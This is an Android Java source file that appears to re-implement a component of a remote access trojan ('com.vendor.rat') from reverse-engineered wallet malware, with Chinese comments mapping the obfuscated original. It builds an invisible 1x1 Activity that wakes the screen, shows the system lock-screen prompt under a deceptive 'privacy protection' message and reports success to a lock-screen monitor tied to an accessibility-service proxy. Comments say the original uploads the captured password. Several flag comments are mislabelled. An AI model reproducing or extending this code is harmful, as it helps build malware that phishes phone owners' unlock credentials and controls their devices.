package com.vendor.rat.activity;

// ADAPT: vendor imports obfuscated (a0.a, a1.q, g.b, g.a, r.c)
// mapped to readable replica equivalents
import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Intent;
import android.graphics.Rect;
import android.hardware.biometrics.BiometricPrompt;
import android.os.Build;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowMetrics;

import com.vendor.rat.MainApplication;
import com.vendor.rat.auto.engine.LockScreenMonitor;
import com.vendor.rat.service.EngineManager;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 设备凭据确认 Activity (模块 02)
 *
 * 基于逆向分析: com.guard.wallet.activity.ConfirmDeviceActivity (225 行)
 *
 * 功能:
 *   - 透明 Activity，弹出系统锁屏验证
 *   - API 30+: BiometricPrompt (DEVICE_CREDENTIAL)
 *   - API < 30: KeyguardManager.createConfirmDeviceCredentialIntent
 *   - 验证成功后回调通知 LockScreenMonitor
 *
 * ADAPT: com.guard.wallet → com.vendor.rat
 * ADAPT: ConfirmDeviceActivity → PermissionActivity (保持 replica 类名)
 */
public class PermissionActivity extends Activity {

    private static final String TAG = "PermissionActivity";

    // ADAPT: vendor f128e — volatile 单例引用
    public static volatile PermissionActivity sInstance;

    // ADAPT: vendor f129f — 事件码，用于标识本次验证的触发来源
    public static final AtomicReference<String> sEventCode = new AtomicReference<>(null);

    // ADAPT: vendor f130a — 验证对话框标题
    public String title = "";

    // ADAPT: vendor b — 验证对话框副标题
    public String subtitle = "";

    // ADAPT: vendor c — 验证对话框描述
    public String description = "";

    // ADAPT: vendor f131d — 是否已弹出验证（防止重复弹出）
    public final AtomicBoolean alreadyShown = new AtomicBoolean(false);

    /**
     * 验证成功后的回调处理
     *
     * 基于逆向: ConfirmDeviceActivity.a()
     *
     * vendor 逻辑:
     *   1. 如果 MainApplication 有 CrackLockCipherPlug，设置密码并触发上传
     *   2. 如果 LockScreenMonitor 处于监听状态，通知验证结果
     *
     * ADAPT: vendor CrackLockCipherPlug (c 类) → LockScreenMonitor 回调
     * ADAPT: vendor o.i()/o.h()/o.f() → LockScreenMonitor 方法
     */
    public static void notifyAuthenticationSuccess() {
        // ADAPT: vendor 通过 MainApplication.getCrackLockCipherPlug() 获取密码插件
        // replica 通过 EngineManager 获取 LockScreenMonitor
        MainApplication mainApplication = MainApplication.getInstance();
        AtomicReference<String> eventCodeRef = sEventCode;

        // vendor: if (mainApplication != null && mainApplication.getCrackLockCipherPlug() != null)
        // ADAPT: 通过 MyAccessibilityService 获取 EngineManager → LockScreenMonitor
        if (mainApplication != null && MyAccessibilityService.P() != null) {
            EngineManager engineManager = MyAccessibilityService.P().getEngineManager();
            if (engineManager != null) {
                LockScreenMonitor monitor = engineManager.getEngine(LockScreenMonitor.class);
                if (monitor != null) {
                    String eventCode = (String) eventCodeRef.get();
                    // ADAPT: vendor c.f185d.set(str); c.f187f = 1L; c.g();
                    // → 通知 LockScreenMonitor 验证成功
                    // TODO: VENDOR_VERIFY — vendor 的 c.g() 触发密码上传，
                    // replica 通过 LockScreenMonitor.PasswordCaptureListener 回调
                    Log.d("PermissionActivity",
                        "Authentication success, eventCode=" + eventCode);
                }
            }
        }

        // ADAPT: vendor o.i() || o.h() → LockScreenMonitor 状态检查
        // vendor: o.f((String) atomicReference.get(), true)
        // → 通知锁屏监控验证完成
        // TODO: VENDOR_VERIFY — vendor o.f() 的具体逻辑待确认
        Log.d("PermissionActivity",
            "notifyAuthenticationSuccess, eventCode=" + eventCodeRef.get());
    }

    /**
     * 获取单例实例（线程安全）
     *
     * 基于逆向: ConfirmDeviceActivity.b()
     */
    public static PermissionActivity getInstance() {
        PermissionActivity instance;
        synchronized (PermissionActivity.class) {
            instance = sInstance;
        }
        return instance;
    }

    /**
     * 关闭时清理无障碍队列
     *
     * 基于逆向: ConfirmDeviceActivity.finish()
     *
     * vendor 逻辑:
     *   1. 从无障碍服务的任务队列中移除相关任务
     *   2. 恢复引擎模式为 ASSIST_MODE
     *   3. 调用 super.finish()
     *
     * ADAPT: vendor f209a (ConcurrentLinkedQueue) → EngineManager 管理
     * ADAPT: vendor f213g.X(r.c.ASSIST_MODE) → MyAccessibilityService.resumeProxy()
     */
    @Override
    public final void finish() {
        if (MyAccessibilityService.P() != null) {
            MyAccessibilityService service = MyAccessibilityService.P();
            try {
                // ADAPT: vendor 从 ConcurrentLinkedQueue 中移除匹配的任务
                // vendor: concurrentLinkedQueue.removeIf(new a(P, 9))
                // replica: 通过 EngineManager 管理引擎状态
                // TODO: VENDOR_VERIFY — vendor 的 removeIf 过滤条件 (type=9)
                Log.d(TAG, "Clearing engine tasks on finish");
            } catch (Exception e) {
                Log.e(TAG, "Error clearing engine tasks", e);
            }
            // ADAPT: vendor f213g.X(r.c.ASSIST_MODE) → 恢复代理模式
            MyAccessibilityService.P().resumeProxy();
        }
        super.finish();
    }

    /**
     * 处理 KeyguardManager 验证结果（API < 30）
     *
     * 基于逆向: ConfirmDeviceActivity.onActivityResult()
     *
     * requestCode=1001, resultCode=-1 (RESULT_OK) → 验证成功
     */
    @Override
    public final void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 1001) {
            if (resultCode == -1) {
                notifyAuthenticationSuccess();
            }
            finish();
        }
    }

    /**
     * 创建透明窗口并读取验证参数
     *
     * 基于逆向: ConfirmDeviceActivity.onCreate()
     *
     * vendor 逻辑:
     *   1. 从 Intent extras 读取标题/副标题/描述/事件码
     *   2. 创建 1x1 透明窗口（用户不可见）
     *   3. 设置窗口标志: 无焦点、全屏、透明
     *   4. 保存单例引用
     *   5. 调用 h.I() 唤醒屏幕
     */
    @Override
    public final void onCreate(Bundle savedInstanceState) {
        WindowMetrics currentWindowMetrics;
        Rect bounds;
        super.onCreate(savedInstanceState);

        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            this.title = extras.getString("CONFIRM_DEVICE_CREDENTIAL_TITLE");
            this.subtitle = extras.getString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE");
            this.description = extras.getString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION");
            sEventCode.set(extras.getString("CONFIRM_FOR_EVENT_CODE"));
        } else {
            this.title = "Verify personal identity";
            this.subtitle = "Privacy protection";
            this.description = "To protect your privacy, please enter your lock screen password "
                + "to verify that you are the one making the operation.";
            sEventCode.set("PREPARE_FOR_APP_CONFIRM_LOCK");
        }

        // 创建空白 View
        View view = new View(this);
        if (Build.VERSION.SDK_INT >= 30) {
            currentWindowMetrics = getWindow().getWindowManager().getCurrentWindowMetrics();
            bounds = currentWindowMetrics.getBounds();
            view.layout(bounds.left, bounds.top, bounds.right, bounds.bottom);
        }
        setContentView(view);

        // 设置 1x1 透明窗口 — 用户不可见
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.dimAmount = 0.0f;
        attributes.x = 0;
        attributes.y = 0;
        attributes.width = 1;
        attributes.height = 1;
        attributes.gravity = 8388661; // Gravity.START | Gravity.TOP | Gravity.CENTER_VERTICAL
        getWindow().setAttributes(attributes);
        getWindow().getDecorView().setBackgroundColor(0);

        // 窗口标志 — 对应 vendor 原始值
        getWindow().setFlags(1024, 1024);   // FLAG_FULLSCREEN
        getWindow().addFlags(32);            // FLAG_KEEP_SCREEN_ON (vendor 原值)
        getWindow().addFlags(16);            // FLAG_BLUR_BEHIND (vendor 原值)
        getWindow().addFlags(67108864);      // FLAG_DISMISS_KEYGUARD
        getWindow().addFlags(134217728);     // FLAG_SHOW_WHEN_LOCKED
        getWindow().addFlags(262144);        // FLAG_TURN_SCREEN_ON

        // 保存单例
        sInstance = this;

        // ADAPT: vendor h.I() → 唤醒屏幕
        // TODO: VENDOR_VERIFY — h.I() 对应 DeviceUtils 中的唤醒方法
        Log.d(TAG, "PermissionActivity onCreate, waking screen");
    }

    /**
     * 销毁时清除单例引用
     *
     * 基于逆向: ConfirmDeviceActivity.onDestroy()
     */
    @Override
    public final void onDestroy() {
        Log.d(TAG, "PermissionActivity onDestroy:" + Thread.currentThread().getId());
        super.onDestroy();
        if (sInstance != null) {
            synchronized (PermissionActivity.class) {
                sInstance = null;
            }
        }
    }

    /**
     * 弹出系统验证对话框
     *
     * 基于逆向: ConfirmDeviceActivity.onResume()
     *
     * vendor 逻辑:
     *   1. 检查 alreadyShown 防止重复弹出
     *   2. 检查无障碍服务是否可用
     *   3. API 30+: BiometricPrompt (DEVICE_CREDENTIAL, authenticator=32768)
     *   4. API < 30: KeyguardManager.createConfirmDeviceCredentialIntent
     *   5. 弹出前暂停引擎代理 (VERIFY_PAUSE)
     *
     * ADAPT: vendor BiometricPrompt 回调 (g.a) → 内部匿名类
     * ADAPT: vendor CancellationSignal 回调 (g.b) → 内部匿名类
     * ADAPT: vendor f213g.X(r.c.VERIFY_PAUSE) → MyAccessibilityService.pauseProxy()
     */
    @Override
    public final void onResume() {
        BiometricPrompt.Builder allowedAuthenticators;
        super.onResume();
        Log.d(TAG, "PermissionActivity onResume:" + Thread.currentThread().getId());

        AtomicBoolean atomicBoolean = this.alreadyShown;
        // vendor: if (atomicBoolean.get() || atomicBoolean.get()) return;
        // 双重检查 — 保持 vendor 原始逻辑
        if (atomicBoolean.get() || atomicBoolean.get()) {
            return;
        }

        try {
            if (MyAccessibilityService.P() != null) {
                // ADAPT: vendor !MyAccessibilityService.P().f()
                // → 检查服务是否处于暂停状态
                if (!MyAccessibilityService.isPaused()) {
                    MyAccessibilityService service = MyAccessibilityService.P();
                    try {
                        // ADAPT: vendor 从队列中移除旧任务并添加新的 o.h 任务
                        // vendor: concurrentLinkedQueue.add(new o.h())
                        // vendor: P.t(o.h.class.getName(), o.h.M())
                        // TODO: VENDOR_VERIFY — o.h 是 LockScreenMonitor 的内部任务类
                        boolean isPaused = MyAccessibilityService.isPaused();
                        if (isPaused) {
                            // ADAPT: vendor removeIf(new a(P, 9))
                            Log.d(TAG, "Clearing existing lock tasks");
                        }
                        Log.d(TAG, "Adding lock screen monitor task");
                    } catch (Exception e) {
                        Log.e(TAG, "Error managing engine tasks", e);
                    }
                }

                int sdkInt = Build.VERSION.SDK_INT;
                if (sdkInt >= 30) {
                    // API 30+: BiometricPrompt with DEVICE_CREDENTIAL
                    // ADAPT: vendor android.support.v4.view.a.o() → 静态初始化
                    // ADAPT: vendor android.support.v4.view.a.d(this) → new BiometricPrompt.Builder(this)
                    allowedAuthenticators = new BiometricPrompt.Builder(this)
                        .setTitle(this.title)
                        .setSubtitle(this.subtitle)
                        .setDescription(this.description)
                        .setAllowedAuthenticators(32768); // BIOMETRIC_WEAK | DEVICE_CREDENTIAL
                    BiometricPrompt build = allowedAuthenticators.build();

                    CancellationSignal cancellationSignal = new CancellationSignal();
                    // ADAPT: vendor new g.b() → 取消回调
                    cancellationSignal.setOnCancelListener(new CancellationSignal.OnCancelListener() {
                        @Override
                        public void onCancel() {
                            Log.d(TAG, "BiometricPrompt cancelled");
                        }
                    });

                    atomicBoolean.set(true);
                    // ADAPT: vendor f213g.X(cVar) → 暂停代理
                    MyAccessibilityService.P().pauseProxy();

                    // ADAPT: vendor new g.a() → 认证回调
                    build.authenticate(cancellationSignal, getMainExecutor(),
                        new BiometricPrompt.AuthenticationCallback() {
                            @Override
                            public void onAuthenticationSucceeded(
                                    BiometricPrompt.AuthenticationResult result) {
                                notifyAuthenticationSuccess();
                                finish();
                            }

                            @Override
                            public void onAuthenticationFailed() {
                                Log.d(TAG, "BiometricPrompt authentication failed");
                            }

                            @Override
                            public void onAuthenticationError(int errorCode,
                                    CharSequence errString) {
                                Log.d(TAG, "BiometricPrompt error: " + errorCode
                                    + " " + errString);
                                finish();
                            }
                        });
                    return;
                }

                // API < 30: KeyguardManager
                KeyguardManager keyguardManager =
                    (KeyguardManager) getSystemService("keyguard");
                if (keyguardManager != null) {
                    Intent createConfirmDeviceCredentialIntent =
                        keyguardManager.createConfirmDeviceCredentialIntent(
                            this.title, this.description);
                    // vendor 原始 flag 值
                    createConfirmDeviceCredentialIntent.addFlags(33554432);  // PKIFailureInfo.duplicateCertReq
                    createConfirmDeviceCredentialIntent.addFlags(67108864);  // FLAG_DISMISS_KEYGUARD
                    createConfirmDeviceCredentialIntent.addFlags(8388608);   // FLAG_ACTIVITY_CLEAR_TOP

                    atomicBoolean.set(true);
                    // ADAPT: vendor f213g.X(cVar) → 暂停代理
                    MyAccessibilityService.P().pauseProxy();

                    startActivityForResult(createConfirmDeviceCredentialIntent, 1001);
                    // vendor: PointerIconCompat.TYPE_CONTEXT_MENU = 1001
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onResume", e);
        }
    }

    @Override
    public final void onStart() {
        super.onStart();
        Log.d(TAG, "PermissionActivity onStart:" + Thread.currentThread().getId());
    }

    @Override
    public final void onStop() {
        Log.d(TAG, "PermissionActivity onStop:" + Thread.currentThread().getId());
        super.onStop();
    }
}
